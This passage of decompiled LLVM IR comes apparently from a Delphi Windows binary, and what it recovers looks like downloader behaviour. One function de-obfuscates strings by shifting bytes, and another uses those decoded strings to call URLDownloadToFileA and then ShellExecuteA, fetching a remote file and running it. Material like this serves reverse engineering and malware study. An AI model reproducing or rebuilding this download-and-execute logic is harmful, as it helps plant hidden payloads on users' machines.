  %0 = call i32 @"@HandleFinally"(), !insn.addr !1560
  ret i32 %0, !insn.addr !1560
}

define i32 @function_406606() local_unnamed_addr {
dec_label_pc_406606:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1561
}

define i32 @function_406608(i32 %arg1) local_unnamed_addr {
dec_label_pc_406608:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1562
}

define i32 @function_40660c() local_unnamed_addr {
dec_label_pc_40660c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1563
  %2 = add i32 %1, -1, !insn.addr !1563
  store i32 %2, i32* @global_var_4096d8, align 4, !insn.addr !1563
  ret i32 %0, !insn.addr !1564
}

define i32 @function_406614() local_unnamed_addr {
dec_label_pc_406614:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1565
  ret i32 %0, !insn.addr !1565
}

define i32 @function_40661c() local_unnamed_addr {
dec_label_pc_40661c:
  %esi.0.reg2mem = alloca i32, !insn.addr !1566
  %ebx.0.reg2mem = alloca i32, !insn.addr !1566
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1567
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1568
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1568
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1568
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1569
  %4 = call i32 @function_4034c8(), !insn.addr !1570
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1571
  %6 = call i32 @function_4034c8(), !insn.addr !1572
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1573
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1573
  br i1 %7, label %dec_label_pc_406692, label %dec_label_pc_406662, !insn.addr !1573

dec_label_pc_406662:                              ; preds = %dec_label_pc_40661c, %dec_label_pc_40668e
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1574
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1574
  %11 = load i8, i8* %10, align 1, !insn.addr !1574
  %12 = icmp eq i8 %11, 61, !insn.addr !1574
  %13 = icmp eq i1 %12, false, !insn.addr !1575
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40667a, label %dec_label_pc_40666c, !insn.addr !1575

dec_label_pc_40666c:                              ; preds = %dec_label_pc_406662
  %15 = add i32 %14, %8, !insn.addr !1576
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1576
  store i8 46, i8* %16, align 1, !insn.addr !1576
  br label %dec_label_pc_40668e, !insn.addr !1577

dec_label_pc_40667a:                              ; preds = %dec_label_pc_406662
  %17 = load i8, i8* %10, align 1, !insn.addr !1578
  %18 = add i8 %17, -1, !insn.addr !1579
  %19 = add i32 %14, %8, !insn.addr !1580
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1580
  store i8 %18, i8* %20, align 1, !insn.addr !1580
  br label %dec_label_pc_40668e, !insn.addr !1580

dec_label_pc_40668e:                              ; preds = %dec_label_pc_40667a, %dec_label_pc_40666c
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1581
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1582
  %23 = icmp eq i32 %22, 0, !insn.addr !1582
  %24 = icmp eq i1 %23, false, !insn.addr !1583
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1583
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1583
  br i1 %24, label %dec_label_pc_406662, label %dec_label_pc_406692, !insn.addr !1583

dec_label_pc_406692:                              ; preds = %dec_label_pc_40668e, %dec_label_pc_40661c
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1584
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1585
  %26 = call i32 @"@LStrClr"(), !insn.addr !1586
  ret i32 %26, !insn.addr !1587
}

define i32 @function_4066a8() local_unnamed_addr {
dec_label_pc_4066a8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1588
  ret i32 %0, !insn.addr !1588
}

define i32 @function_4066ad() local_unnamed_addr {
dec_label_pc_4066ad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1589
}

define i32 @function_4066af(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4066af:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1590
}

define i32 @function_4066b8() local_unnamed_addr {
dec_label_pc_4066b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1591
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1592
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1593
  ret i32 %4, !insn.addr !1594
}

define i32 @function_4066f0() local_unnamed_addr {
dec_label_pc_4066f0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1595
  %esp.0.reg2mem = alloca i32, !insn.addr !1595
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1595
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1596
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1596
  br label %dec_label_pc_4066f8, !insn.addr !1596

dec_label_pc_4066f8:                              ; preds = %dec_label_pc_4066f8, %dec_label_pc_4066f0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1597
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1597
  store i32 0, i32* %2, align 4, !insn.addr !1597
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1598
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1598
  store i32 0, i32* %4, align 4, !insn.addr !1598
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1599
  %6 = icmp eq i32 %5, 0, !insn.addr !1599
  %7 = icmp eq i1 %6, false, !insn.addr !1600
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1600
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1600
  br i1 %7, label %dec_label_pc_4066f8, label %dec_label_pc_4066ff, !insn.addr !1600

dec_label_pc_4066ff:                              ; preds = %dec_label_pc_4066f8
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1601
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1601
  store i32 0, i32* %9, align 4, !insn.addr !1601
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1602
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1602
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1603
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1603
  store i32 %0, i32* %13, align 4, !insn.addr !1603
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1604
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1604
  store i32 4220983, i32* %15, align 4, !insn.addr !1604
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1605
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1605
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1605
  store i32 %16, i32* %18, align 4, !insn.addr !1605
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1606
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1607
  %20 = call i32 @function_40661c(), !insn.addr !1608
  %21 = call i32 @function_4036c8(), !insn.addr !1609
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1610
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1611
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1611
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1611
  store i32 %25, i32* %24, align 4, !insn.addr !1611
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1612
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1613
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1614
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1614
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1614
  store i32 %30, i32* %29, align 4, !insn.addr !1614
  %31 = call i32 @function_4034c8(), !insn.addr !1615
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1616
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1617
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1617
  store i32 ptrtoint ([6 x i8]* @global_var_40684c to i32), i32* %34, align 4, !insn.addr !1617
  %35 = call i32 @function_4066b8(), !insn.addr !1618
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1619
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1619
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1620
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1620
  store i32 ptrtoint (i32* @global_var_40685c to i32), i32* %39, align 4, !insn.addr !1620
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1621
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1621
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1621
  store i32 %40, i32* %42, align 4, !insn.addr !1621
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1622
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1623
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1623
  store i32 0, i32* %45, align 4, !insn.addr !1623
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1624
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1624
  store i32 0, i32* %47, align 4, !insn.addr !1624
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1625
  %49 = call i32 @function_4036c8(), !insn.addr !1626
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1627
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1627
  store i32 %49, i32* %51, align 4, !insn.addr !1627
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1628
  %53 = call i32 @function_40661c(), !insn.addr !1629
  %54 = call i32 @function_4036c8(), !insn.addr !1630
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1631
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1631
  store i32 %54, i32* %56, align 4, !insn.addr !1631
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1632
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1632
  store i32 0, i32* %58, align 4, !insn.addr !1632
  %59 = call i32 @function_406614(), !insn.addr !1633
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1634
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1634
  store i32 1, i32* %61, align 4, !insn.addr !1634
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1635
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1635
  store i32 0, i32* %63, align 4, !insn.addr !1635
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1636
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1636
  store i32 0, i32* %65, align 4, !insn.addr !1636
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1637
  %67 = call i32 @function_4036c8(), !insn.addr !1638
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1639
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1639
  store i32 %67, i32* %69, align 4, !insn.addr !1639
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1640
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1640
  store i32 ptrtoint ([5 x i8]* @global_var_40686c to i32), i32* %71, align 4, !insn.addr !1640
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1641
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1641
  store i32 0, i32* %73, align 4, !insn.addr !1641
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1642
  %75 = load i32, i32* %73, align 4, !insn.addr !1643
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1644
  store i32 4220990, i32* %69, align 4, !insn.addr !1645
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1646
  ret i32 %76, !insn.addr !1647
}

define i32 @function_406837() local_unnamed_addr {
dec_label_pc_406837:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1648
  ret i32 %0, !insn.addr !1648
}

define i32 @function_40683c() local_unnamed_addr {
dec_label_pc_40683c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1649
}

define i32 @function_40683e(i32 %arg1) local_unnamed_addr {
dec_label_pc_40683e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1650
}

define i32 @function_406863(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406863:
  %esp.1.reg2mem = alloca i32, !insn.addr !1651
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1651
  %ecx.0.reg2mem = alloca i32, !insn.addr !1651
  %esp.0.reg2mem = alloca i32, !insn.addr !1651
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1651
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1651
  store i32 %5, i32* %6, align 4, !insn.addr !1651
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1652
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1652
  %11 = add i8 %8, %10, !insn.addr !1652
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1652
  store i8 %11, i8* %12, align 1, !insn.addr !1652
  %13 = add i32 %2, 58, !insn.addr !1653
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1653
  %15 = load i8, i8* %14, align 1, !insn.addr !1653
  %16 = load i32, i32* %eax, align 4, !insn.addr !1653
  %17 = udiv i32 %16, 256, !insn.addr !1653
  %18 = trunc i32 %17 to i8, !insn.addr !1653
  %19 = add i8 %15, %18, !insn.addr !1653
  store i8 %19, i8* %14, align 1, !insn.addr !1653
  %20 = add i32 %0, 112, !insn.addr !1654
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1654
  %22 = load i8, i8* %21, align 1, !insn.addr !1654
  %23 = trunc i32 %4 to i8, !insn.addr !1654
  %24 = add i8 %22, %23, !insn.addr !1654
  store i8 %24, i8* %21, align 1, !insn.addr !1654
  %25 = trunc i32 %3 to i16, !insn.addr !1655
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1655
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1655
  %27 = load i8, i8* %7, align 4, !insn.addr !1656
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1656
  %30 = add i8 %27, %29, !insn.addr !1656
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1656
  store i8 %30, i8* %31, align 1, !insn.addr !1656
  %32 = load i8, i8* %7, align 4, !insn.addr !1657
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1657
  %35 = add i8 %32, %34, !insn.addr !1657
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1657
  store i8 %35, i8* %36, align 1, !insn.addr !1657
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1658
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1659
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1659
  br label %dec_label_pc_40687c, !insn.addr !1659

dec_label_pc_40687c:                              ; preds = %dec_label_pc_40687c, %dec_label_pc_406863
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1660
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1660
  store i32 0, i32* %39, align 4, !insn.addr !1660
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1661
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1661
  store i32 0, i32* %41, align 4, !insn.addr !1661
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1662
  %43 = icmp eq i32 %42, 0, !insn.addr !1662
  %44 = icmp eq i1 %43, false, !insn.addr !1663
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1663
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1663
  br i1 %44, label %dec_label_pc_40687c, label %dec_label_pc_406883, !insn.addr !1663

dec_label_pc_406883:                              ; preds = %dec_label_pc_40687c
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1664
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1664
  store i32 0, i32* %46, align 4, !insn.addr !1664
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1665
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1665
  store i32 %37, i32* %48, align 4, !insn.addr !1665
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1666
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1666
  store i32 4221720, i32* %50, align 4, !insn.addr !1666
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1667
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1667
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1667
  store i32 %51, i32* %53, align 4, !insn.addr !1667
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1668
  %54 = call i32 @"@LStrPos"(), !insn.addr !1669
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1670
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1670
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1670
  store i32 %57, i32* %56, align 4, !insn.addr !1670
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1671
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1672
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1672
  store i32 %61, i32* %60, align 4, !insn.addr !1672
  %62 = call i32 @function_4034c8(), !insn.addr !1673
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1674
  %64 = add i32 %arg1, -1, !insn.addr !1675
  store i32 %64, i32* %eax, align 4, !insn.addr !1675
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406afd [
    i32 0, label %dec_label_pc_4068f5
    i32 1, label %dec_label_pc_406a35
    i32 2, label %dec_label_pc_406aa3
  ]

dec_label_pc_4068f5:                              ; preds = %dec_label_pc_406883
  %65 = call i32 @function_4034c8(), !insn.addr !1676
  %66 = icmp slt i32 %65, 5, !insn.addr !1677
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1677
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1677
  br i1 %66, label %dec_label_pc_406afd, label %dec_label_pc_406906, !insn.addr !1677

dec_label_pc_406906:                              ; preds = %dec_label_pc_4068f5
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1678
  %68 = call i32 @function_40661c(), !insn.addr !1679
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1680
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1680
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1681
  %72 = call i32 @function_40661c(), !insn.addr !1682
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1683
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1683
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1684
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1684
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1684
  store i32 %75, i32* %77, align 4, !insn.addr !1684
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1685
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1685
  store i32 ptrtoint (i32* @global_var_406b3c to i32), i32* %79, align 4, !insn.addr !1685
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1686
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1686
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1686
  store i32 %80, i32* %82, align 4, !insn.addr !1686
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1687
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1688
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1688
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1689
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1689
  store i32 4221768, i32* %87, align 4, !insn.addr !1689
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1690
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1690
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1690
  store i32 %88, i32* %90, align 4, !insn.addr !1690
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1691
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1691
  store i32 4221784, i32* %92, align 4, !insn.addr !1691
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1692
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1692
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1692
  store i32 %93, i32* %95, align 4, !insn.addr !1692
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1693
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1693
  store i32 4221800, i32* %97, align 4, !insn.addr !1693
  %98 = call i32 @function_4079c0(), !insn.addr !1694
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1695
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1695
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1696
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1697
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1697
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1698
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1698
  store i32 %106, i32* %105, align 4, !insn.addr !1698
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1699
  %108 = call i32 @function_40661c(), !insn.addr !1700
  %109 = call i32 @"@LStrPos"(), !insn.addr !1701
  %110 = add i32 %109, -1, !insn.addr !1702
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1703
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1703
  store i32 %110, i32* %112, align 4, !insn.addr !1703
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1704
  %114 = call i32 @function_40661c(), !insn.addr !1705
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1706
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1707
  store i32 %116, i32* %112, align 4, !insn.addr !1708
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1709
  %118 = call i32 @function_40661c(), !insn.addr !1710
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1711
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1711
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1712
  %122 = call i32 @function_40661c(), !insn.addr !1713
  %123 = call i32 @function_405cfc(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1714
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1715
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1715
  br label %dec_label_pc_406afd, !insn.addr !1715

dec_label_pc_406a35:                              ; preds = %dec_label_pc_406883
  %124 = call i32 @function_4034c8(), !insn.addr !1716
  %125 = icmp slt i32 %124, 5, !insn.addr !1717
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1717
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1717
  br i1 %125, label %dec_label_pc_406afd, label %dec_label_pc_406a46, !insn.addr !1717

dec_label_pc_406a46:                              ; preds = %dec_label_pc_406a35
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1718
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1718
  store i32 ptrtoint ([5 x i8]* @global_var_406b88 to i32), i32* %127, align 4, !insn.addr !1718
  %128 = call i32 @function_40504c(), !insn.addr !1719
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1720
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1720
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1721
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1721
  store i32 ptrtoint ([7 x i8]* @global_var_406b98 to i32), i32* %132, align 4, !insn.addr !1721
  %133 = call i32 @function_40504c(), !insn.addr !1722
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1723
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1724
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1725
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1725
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1726
  %140 = call i32 @function_40661c(), !insn.addr !1727
  %141 = call i32 @function_4051a4(), !insn.addr !1728
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1729
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1729
  br label %dec_label_pc_406afd, !insn.addr !1729

dec_label_pc_406aa3:                              ; preds = %dec_label_pc_406883
  %142 = call i32 @function_4034c8(), !insn.addr !1730
  %143 = icmp slt i32 %142, 5, !insn.addr !1731
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1731
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1731
  br i1 %143, label %dec_label_pc_406afd, label %dec_label_pc_406ab0, !insn.addr !1731

dec_label_pc_406ab0:                              ; preds = %dec_label_pc_406aa3
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1732
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1732
  store i32 ptrtoint ([5 x i8]* @global_var_406b88 to i32), i32* %145, align 4, !insn.addr !1732
  %146 = call i32 @function_40504c(), !insn.addr !1733
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1734
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1734
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1735
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1735
  store i32 ptrtoint ([7 x i8]* @global_var_406b98 to i32), i32* %150, align 4, !insn.addr !1735
  %151 = call i32 @function_40504c(), !insn.addr !1736
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1737
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1738
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1739
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1739
  %157 = call i32 @function_40661c(), !insn.addr !1740
  %158 = call i32 @function_4051a4(), !insn.addr !1741
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1741
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1741
  br label %dec_label_pc_406afd, !insn.addr !1741

dec_label_pc_406afd:                              ; preds = %dec_label_pc_406883, %dec_label_pc_406ab0, %dec_label_pc_406aa3, %dec_label_pc_406a46, %dec_label_pc_406a35, %dec_label_pc_406906, %dec_label_pc_4068f5
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1742
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1742
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1743
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1744
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1745
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1745
  store i32 4221727, i32* %163, align 4, !insn.addr !1745
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1746
  ret i32 %164, !insn.addr !1747
}

define i32 @function_406b18() local_unnamed_addr {
dec_label_pc_406b18:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1748
  ret i32 %0, !insn.addr !1748
}

define i32 @function_406b1d() local_unnamed_addr {
dec_label_pc_406b1d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1749
}

define i32 @function_406b1f(i32 %arg1) local_unnamed_addr {
dec_label_pc_406b1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1750
}

define i32 @function_406b4b() local_unnamed_addr {
dec_label_pc_406b4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1751
}

define i32 @function_406b53() local_unnamed_addr {
dec_label_pc_406b53:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1752
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1752
